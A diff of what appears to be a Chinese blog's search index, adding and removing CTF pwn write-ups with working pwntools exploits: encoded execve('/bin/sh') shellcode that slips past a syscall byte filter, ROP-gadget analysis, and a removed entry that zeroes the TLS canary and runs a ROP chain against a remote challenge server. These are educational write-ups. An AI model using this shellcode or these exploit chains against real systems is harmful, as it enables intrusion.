@@ -124,6 +124,146 @@
       </tags>
   </entry>
   <entry>
+    <title>CTF题解：onlyfgets</title>
+    <url>/2025/12/08/2025-12-08-onlyfgets/</url>
+    <content><![CDATA[<h1 id="onlyfgets"><a href="#onlyfgets" class="headerlink" title="onlyfgets"></a>onlyfgets</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/onlyfgets/checksec.png" alt="image-20251207102811670"></p>
+<p><img src="/images/onlyfgets/main.png" alt="image-20251207102832960"></p>
+<p><img src="/images/onlyfgets/222.png" alt="image-20251207102938104"></p>
+<p>程序只有NX保护，且有简单栈溢出。但是，查看程序没有system等可以直接获得shell的gadget</p>
+<p>有signal和alarm，根据提示gadget：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00000000004010ae : add bl, dh ; endbr64 ; ret</span><br><span class="line">0x000000000040114c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：</p>
+<p><code>endbr64</code>（End Branch 64-bit）是 <strong>Intel CET</strong>（Control-flow Enforcement Technology）技术的一部分，用于防止ROP攻击。</p>
+<p>作用：endbr64  ; 标记这是一个合法的间接跳转目标</p>
+<p>工作原理：</p>
+<ol>
+<li>运行时检查：当程序通过间接跳转（如 <code>call rax</code>, <code>jmp [rbx]</code>）执行时</li>
+<li>如果目标地址不是 <code>endbr64</code> 指令 → 触发异常</li>
+<li>如果是 <code>endbr64</code> 指令→ 正常执行</li>
+</ol>
+</blockquote>
+<p>分析一下两个原语</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># add bl, dh ; ret</span></span><br><span class="line"><span class="comment">#能力：</span></span><br><span class="line"><span class="number">1.</span> 修改 RBX 的最低字节：BL = BL + DH</span><br><span class="line"><span class="number">2.</span> 不影响其他寄存器（除了 RBX）</span><br><span class="line"><span class="number">3.</span> 返回控制流</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制：</span></span><br><span class="line"><span class="number">1.</span> 只能加，不能减（除非溢出）</span><br><span class="line"><span class="number">2.</span> 只能修改最低字节</span><br><span class="line"><span class="number">3.</span> DH 的值是运行时决定的</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span></span><br><span class="line"><span class="comment">#能力：</span></span><br><span class="line"><span class="number">1.</span> 内存加法：*(rbp-<span class="number">0x3d</span>) += ebx</span><br><span class="line"><span class="number">2.</span> 操作<span class="number">32</span>位数据（dword）</span><br><span class="line"><span class="number">3.</span> 返回控制流</span><br><span class="line"></span><br><span class="line"><span class="comment">#限制：</span></span><br><span class="line"><span class="number">1.</span> 只能加，不能减</span><br><span class="line"><span class="number">2.</span> 只能操作 [rbp-<span class="number">0x3d</span>] 这个固定偏移</span><br><span class="line"><span class="number">3.</span> 操作<span class="number">4</span>字节，可能影响指针的高位</span><br></pre></td></tr></table></figure>
+
+<p><strong>假设我们可以控制 rbp 和 ebx，就可以向任意地址 (rbp - 0x3d) 加任意值 (ebx)</strong></p>
+<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><h3 id="（一）-原语利用"><a href="#（一）-原语利用" class="headerlink" title="（一） 原语利用"></a>（一） 原语利用</h3><h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>根据上述分析，我们尝试控制 rbp 和 ebx，查一下 pop 指令：</p>
+<p><img src="/images/onlyfgets/step1.png" alt="image-20251208144151439"></p>
+<p>可以看到，我们有了gadget</p>
+<ul>
+<li>0x000000000040114d : pop rbp ; ret</li>
+<li>0x00000000004011fc : pop rdi ; ret</li>
+</ul>
+<p>但是无法直接控制 ebx。思考，ebx 可以通过 bl + dh 修改，通过调试命令查看一下dh</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xae\x10\x40\x00\x00\x00\x00\x00&quot;</span> | gdb ./onlyfgets -ex <span class="string">&quot;b *0x4010ae&quot;</span> -ex <span class="string">&quot;r&quot;</span> -ex <span class="string">&quot;print (\$rdx &gt;&gt; 8) &amp; 0xFF&quot;</span> -ex <span class="string">&quot;c&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：</p>
+<ol>
+<li><p>输入</p>
+<ul>
+<li><p><code>-e</code>：启用转义字符解释</p>
+</li>
+<li><p><code>AAAAAAAA...</code>：40个 ‘A’（32缓存，8 rbp）</p>
+</li>
+<li><p><code>\xae\x10\x40\x00\x00\x00\x00\x00</code>：小端序的 0x4010ae（<code>add bl, dh</code> gadget）</p>
+</li>
+</ul>
+</li>
+<li><p>断点：</p>
+<ul>
+<li><p><code>-ex</code>：执行gdb命令</p>
+</li>
+<li><p><code>b *地址</code>：在指定地址设置断点</p>
+</li>
+<li><p><code>0x4010ae</code>：<code>add bl, dh</code> gadget 的地址</p>
+</li>
+</ul>
+</li>
+<li><p>计算</p>
+<ul>
+<li><p><code>-ex &quot;r&quot; </code> ：运行程序</p>
+</li>
+<li><p><code>\$rdx</code>：RDX 寄存器（需要转义 <code>$</code>）</p>
+</li>
+<li><p><code>&gt;&gt; 8</code>：右移8位（获取高8位）</p>
+</li>
+<li><p><code>&amp; 0xFF</code>：取低8位</p>
+</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<p>运行结果：</p>
+<p><img src="/images/onlyfgets/step11.png" alt="image-20251208150004782"></p>
+<p>可以看到计算出 $1 (即dh) &#x3D; 32 (0x20)。或者直接看下面RDX显示的0xfbad208b</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x00000000fbad208b</span><br><span class="line">          ↑↑</span><br><span class="line">高位字节   低位字节</span><br><span class="line"></span><br><span class="line">RDX（64位）：0x00000000fbad208b</span><br><span class="line">EDX（32位）：0xfbad208b  </span><br><span class="line">DX（16位）：0x208b</span><br><span class="line">DH（高8位）：0x20</span><br><span class="line">DL（低8位）：0x8b</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>(注：</p>
+<p><strong>这是 <code>_IO_FILE</code> 结构的标志位。<code>0xfbad</code> 是 glibc 的魔法数字，标识这是一个 <code>_IO_FILE</code> 结构；而标志位 <code>0x208b</code>，</strong></p>
+<ul>
+<li><p>0x2000 &#x3D; _IO_USER_BUF    (0x2000) - 用户提供的缓冲区</p>
+</li>
+<li><p>0x0080 &#x3D; _IO_CURRENTLY_PUTTING (0x0080) - 当前正在写入</p>
+</li>
+<li><p>0x0008 &#x3D; _IO_NO_READS    (0x0008) - 不允许读取</p>
+</li>
+<li><p>0x0002 &#x3D; _IO_LINE_BUF    (0x0002) - 行缓冲</p>
+</li>
+<li><p>0x0001 &#x3D; _IO_UNBUFFERED  (0x0001) - 无缓冲)</p>
+</li>
+</ul>
+<p><strong>所以，DH 值是固定的：来自 stdin 的 flags 字段，每次都是 0x20，无法改变，除非能修改内存中的 stdin 结构本身</strong></p>
+</blockquote>
+<h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>现在我们确认了，每次 add bl, dh 会给 bl 加 0x20，所以需要加上0x20的倍数，加法后的地址必须是<strong>另一个有用函数</strong>的地址</p>
+]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>stack-overflow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF题解：shellcode</title>
+    <url>/2025/12/09/2025-12-09-week1-Shellcode/</url>
+    <content><![CDATA[<h1 id="Shellcode（Decoder）"><a href="#Shellcode（Decoder）" class="headerlink" title="Shellcode（Decoder）"></a>Shellcode（Decoder）</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/shellcode/checksec.png" alt="image-20251209102926831"></p>
+<p>checksec保护几乎全开，来看反编译：</p>
+<p><img src="/images/shellcode/main1.png"></p>
+<p><img src="/images/shellcode/main2.png" alt="image-20251209111737923"></p>
+<p><strong>程序将 <code>DAT_114514000</code> 地址处的数据强制转换为函数指针并执行</strong>。现在问题在于，这里只有40字节布置shellcode，不知道这段区域是否可写可执行，以及filter函数过滤了什么。</p>
+<p>下面再分析一下：</p>
+<p><img src="/images/shellcode/vmmap.png"></p>
+<p><img src="/images/shellcode/filter.png" alt="image-20251209114310555"></p>
+<p>OK，看到 <strong>0x114514000到0x114515000处可写可执行</strong>，但是 **filter 会将连续的 \x0f\x05（<code>syscall</code> 指令的机器码） 转为 \0 **，现在的问题变成了如何绕过 syscall 的检查。</p>
+<p>因为这里只有 <code>\x0f\x05</code> 的过滤，我们可以尝试构造<strong>减1的编码规则，即让 <code>\x0f\x05</code> 变为 <code>\x0e\x04</code></strong>，再通过构造解码器解码syscall，从而绕过syscall过滤。</p>
+<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><p>我们在 filter 和 0x114514000 后面下断点，随便发送40个字符</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(p, <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *filter</span></span><br><span class="line"><span class="string">b *0x114514000</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/shellcode/xgx.png" alt="image-20251209212032233"></p>
+<p>可以看到全部落在了 0x114514000 区域，多运行几次发现，尽管有pie，这片区域地址不变。并且在执行0x114514000 区域前，0x114514000 会被加载到 rax 里，我们可以利用 rax 来计算要解码的 syscall 地址</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&quot;\x48\x31\xff&quot;</span>                                <span class="comment"># xor rdi, rdi </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57&quot;</span>                                        <span class="comment"># push rdi</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span>    <span class="comment"># mov rdi, 0x68732f6e69622f2f</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57&quot;</span>                                        <span class="comment"># push rdi</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x89\xe7&quot;</span>                                <span class="comment"># mov rdi, rsp</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x31\xf6&quot;</span>                                <span class="comment"># xor rsi, rsi </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x31\xd2&quot;</span>                                <span class="comment"># xor rdx, rdx </span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfe\x40\x21&quot;</span>                                <span class="comment"># inc byte [rax + 0x20]</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfe\x40\x22&quot;</span>                                <span class="comment"># inc byte [rax +0x21]                                  </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6a\x3b\x58&quot;</span>                                <span class="comment"># push 0x3b; pop rax</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0e\x04&quot;</span>                                    <span class="comment"># 编码后的 syscall</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;shellcode: <span class="subst">&#123;<span class="built_in">len</span>(shellcode)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *filter</span></span><br><span class="line"><span class="comment">#b *0x114514018</span></span><br><span class="line"><span class="comment">#c</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your shellcode: \n&quot;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF题解：Signin</title>
     <url>/2025/12/07/2025-12-08-Signin/</url>
     <content><![CDATA[<h1 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h1><h2 id="一、思路"><a href="#一、思路" class="headerlink" title="一、思路"></a>一、思路</h2><p><img src="/images/signin/checksec.png" alt="image-20251201160105455"></p>
@@ -191,120 +331,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CTF题解：许哥的游戏</title>
-    <url>/2025/12/07/2025-12-07-%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/</url>
-    <content><![CDATA[<h1 id="许哥的游戏"><a href="#许哥的游戏" class="headerlink" title="许哥的游戏"></a>许哥的游戏</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/checksec.png" alt="image-20251203135321711"></p>
-<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/alarm.png" alt="xxxx"></p>
-<ol>
-<li><p>checksec发现需要绕过canary</p>
-</li>
-<li><p>alarm+5里有syscall</p>
-<blockquote>
-<p>注意：libc-2.27.so特有</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#patch为指定动态链接库</span></span><br><span class="line">patchelf --set-interpreter ./ld-2.27.so ./attachment</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp里指定libc</span></span><br><span class="line">sh = process(<span class="string">&#x27;./attachment&#x27;</span>,</span><br><span class="line">	env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.27.so&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>: <span class="string">&#x27;.&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
-
-</blockquote>
-</li>
-<li><p>Weapon</p>
-<p>&#x3D;&#x3D;&gt;set_zero，任意地址写0</p>
-<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/set.png" alt="image-20251205102032289"></p>
-</li>
-<li><p>Fight（close(1)和close(2)关闭标准输出和标准错误</p>
-<p>&#x3D;&#x3D;&gt;challenge3，存在溢出</p>
-<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/challenge3.png" alt="image-20251205102137346"></p>
-</li>
-</ol>
-<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><h3 id="（一）challenge3确认偏移"><a href="#（一）challenge3确认偏移" class="headerlink" title="（一）challenge3确认偏移"></a>（一）challenge3确认偏移</h3><p>在pwndbg中，cyclic 240（反编译中看到缓冲区248），进入challenge3后输入，Ctrl C中断</p>
-<p><img src="/images%5C%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F%5Cfinally.png"></p>
-<p>stack 50查看栈布局</p>
-<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/canary.png" alt="image-20251205102850007"></p>
-<p>可以看到rbp前就是canary，所以偏移：<code>248+canary+rbp+return_addr</code></p>
-<h3 id="（二）size-zero写-tls-中-canary-为0"><a href="#（二）size-zero写-tls-中-canary-为0" class="headerlink" title="（二）size_zero写 tls 中 canary 为0"></a>（二）size_zero写 tls 中 canary 为0</h3><h4 id="i）利用原理"><a href="#i）利用原理" class="headerlink" title="i）利用原理"></a>i）利用原理</h4><ol>
-<li><strong>任意地址写 0</strong>：<ul>
-<li><code>str</code> 是一个全局变量（地址固定）</li>
-<li><code>lVar1</code> 是用户输入的有符号长整数</li>
-<li>最终写入地址：<code>str + lVar1</code></li>
-<li>写入内容：8 字节的 0（<code>undefined8</code> 表示 8 字节）</li>
-</ul>
-</li>
-<li><strong>目标：tls 中的 canary</strong>：<ul>
-<li>在 Linux x64 中，栈保护 canary 存储在 TLS（Thread Local Storage）中</li>
-<li>位置：<code>fs:[0x28]</code>（或 <code>gs:[0x28]</code>，取决于编译）</li>
-<li>每次函数开始时从 <code>fs:[0x28]</code> 加载到栈上</li>
-<li>函数结束前检查栈上的值是否与 <code>fs:[0x28]</code> 中的一致</li>
-</ul>
-</li>
-</ol>
-<h4 id="ii）寻找-tls-canary-地址"><a href="#ii）寻找-tls-canary-地址" class="headerlink" title="ii）寻找 tls canary 地址"></a>ii）寻找 tls canary 地址</h4><ol>
-<li><p>首先在pwndbg中 info registers</p>
-<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/fs.png"></p>
-<p>看到 fs 基址为0x794eabc8c580</p>
-</li>
-<li><p>再 x&#x2F;gx 查看0x28偏移处，通过 stack 20 确认到这里确实是 canary 的地方</p>
-<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/0x28.png" alt="dd"><img src="C:\Users\WH\AppData\Roaming\Typora\typora-user-images\image-20251207111715732.png" alt="image-20251207111715732"></p>
-</li>
-<li><p>因为要加上str指针，所以再查看一下str处的数据</p>
-<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/str.png"></p>
-<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/data.png"></p>
-<p>所以我们需要的输入：<code>0x794eabc8c580 + 0x28 - 0x794eabc8a000 = 0x25a8</code></p>
-</li>
-</ol>
-<h3 id="（三）bless第二关改-alarm-为-syscall"><a href="#（三）bless第二关改-alarm-为-syscall" class="headerlink" title="（三）bless第二关改 alarm 为 syscall"></a>（三）bless第二关改 alarm 为 syscall</h3><p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/attack.png" alt="image-20251207113247398"></p>
-<p>这里有任意地址加5，刚好匹配 alarm + 5 &#x3D; syscall，可以改got表。</p>
-<p>bless后验证一下：</p>
-<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/bless.png" alt="image-20251207113128649"></p>
-<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>最后，在栈溢出部分，有 rbp 的 off-by-null，可以将rbp的最后一个字节覆盖为0，刚好是前面缓冲区22个ret的地址，而且由于执行到了challenge3和Fight的末尾，有两个<code>leave，ret</code>刚好可以<strong>栈迁移</strong>到缓冲区，执行ROP链</p>
-<blockquote>
-<p>注：ret相当于 pop rip ; rip &#x3D; [rsp] ; rsp &#x3D; rsp + 8，所以把alarm@got(即syscall&#x3D;0x602058) pop到rsp里，再通过ret访问got表对应的真实地址</p>
-</blockquote>
-<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/stack.png"></p>
-<p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./attachment&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc-2.27.so&#x27;, &#x27;LD_LIBRARY_PATH&#x27;: &#x27;.&#x27;&#125;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34792</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_info</span>(<span class="params">name, addr</span>):</span><br><span class="line">    output_log = <span class="string">&#x27;&#123;&#125; =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(addr))</span><br><span class="line">    all_logs.append(output_log)</span><br><span class="line">    success(output_log)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">weapon</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;..!?\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bless</span>(<span class="params">count, addr</span>):</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(count).encode())</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(addr).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">content1, content2</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sh.send(content1)</span><br><span class="line">    </span><br><span class="line">    sh.send(content2)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x04007fe</span></span><br><span class="line">pop_rdi = <span class="number">0x4013f4</span></span><br><span class="line">pop_rsi = <span class="number">0x4013f6</span></span><br><span class="line">pop_rdx = <span class="number">0x4013f8</span></span><br><span class="line">pop_rsp = <span class="number">0x4013fa</span></span><br><span class="line">bin_sh = <span class="number">0x4019D7</span></span><br><span class="line">syscall = <span class="number">0x602058</span></span><br><span class="line"></span><br><span class="line">weapon(<span class="number">0x25a8</span>)</span><br><span class="line">bless(<span class="number">5</span>, syscall)</span><br><span class="line"></span><br><span class="line">payload1 = p64(ret)*<span class="number">22</span></span><br><span class="line">rop_chain = p64(pop_rdi) + p64(bin_sh)</span><br><span class="line">rop_chain += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(pop_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(pop_rsp) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload1 = payload1 + rop_chain</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">59</span></span><br><span class="line">challenge(payload1, payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.send(&#x27;exec 1&gt;&amp; 0&#x27;)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>stack-overflow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF题解：shellcode</title>
-    <url>/2025/12/09/2025-12-09-week1-Shellcode/</url>
-    <content><![CDATA[<h1 id="Shellcode（Decoder）"><a href="#Shellcode（Decoder）" class="headerlink" title="Shellcode（Decoder）"></a>Shellcode（Decoder）</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/shellcode/checksec.png" alt="image-20251209102926831"></p>
-<p>checksec保护几乎全开，来看反编译：</p>
-<p><img src="/images/shellcode/main1.png"></p>
-<p><img src="/images/shellcode/main2.png" alt="image-20251209111737923"></p>
-<p><strong>程序将 <code>DAT_114514000</code> 地址处的数据强制转换为函数指针并执行</strong>。现在问题在于，这里只有40字节布置shellcode，不知道这段区域是否可写可执行，以及filter函数过滤了什么。</p>
-<p>下面再分析一下：</p>
-<p><img src="/images/shellcode/vmmap.png"></p>
-<p><img src="/images/shellcode/filter.png" alt="image-20251209114310555"></p>
-<p>OK，看到 <strong>0x114514000到0x114515000处可写可执行</strong>，但是 **filter 会将连续的 \x0f\x05（<code>syscall</code> 指令的机器码） 转为 \0 **，现在的问题变成了如何绕过 syscall 的检查。</p>
-<p>因为这里只有 <code>\x0f\x05</code> 的过滤，我们可以尝试构造<strong>减1的编码规则，即让 <code>\x0f\x05</code> 变为 <code>\x0e\x04</code></strong>，再通过构造解码器解码syscall，从而绕过syscall过滤。</p>
-<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><p>我们在 filter 和 0x114514000 后面下断点，随便发送40个字符</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(p, <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *filter</span></span><br><span class="line"><span class="string">b *0x114514000</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/shellcode/xgx.png" alt="image-20251209212032233"></p>
-<p>可以看到全部落在了 0x114514000 区域，多运行几次发现，尽管有pie，这片区域地址不变。并且在执行0x114514000 区域前，0x114514000 会被加载到 rax 里，我们可以利用 rax 来计算要解码的 syscall 地址</p>
-<p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&quot;\x48\x31\xff&quot;</span>                                <span class="comment"># xor rdi, rdi </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57&quot;</span>                                        <span class="comment"># push rdi</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span>    <span class="comment"># mov rdi, 0x68732f6e69622f2f</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57&quot;</span>                                        <span class="comment"># push rdi</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x89\xe7&quot;</span>                                <span class="comment"># mov rdi, rsp</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x31\xf6&quot;</span>                                <span class="comment"># xor rsi, rsi </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x31\xd2&quot;</span>                                <span class="comment"># xor rdx, rdx </span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfe\x40\x21&quot;</span>                                <span class="comment"># inc byte [rax + 0x20]</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfe\x40\x22&quot;</span>                                <span class="comment"># inc byte [rax +0x21]                                  </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6a\x3b\x58&quot;</span>                                <span class="comment"># push 0x3b; pop rax</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0e\x04&quot;</span>                                    <span class="comment"># 编码后的 syscall</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;shellcode: <span class="subst">&#123;<span class="built_in">len</span>(shellcode)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *filter</span></span><br><span class="line"><span class="comment">#b *0x114514018</span></span><br><span class="line"><span class="comment">#c</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your shellcode: \n&quot;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>shellcode</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CTF题解：eat some AI</title>
     <url>/2026/01/31/2026-01-31-eat%20some%20AI/</url>
     <content><![CDATA[<h1 id="eat-some-AI"><a href="#eat-some-AI" class="headerlink" title="eat some AI"></a>eat some AI</h1><h2 id="一、题目分析"><a href="#一、题目分析" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><p>根据提示，我们要进行Fuzzing，还要分析 <code>game</code> 二进制文件，找到获取 shell 或读取 flag 的利用路径。</p>
@@ -334,6 +360,70 @@
         <tag>ctf</tag>
         <tag>ai</tag>
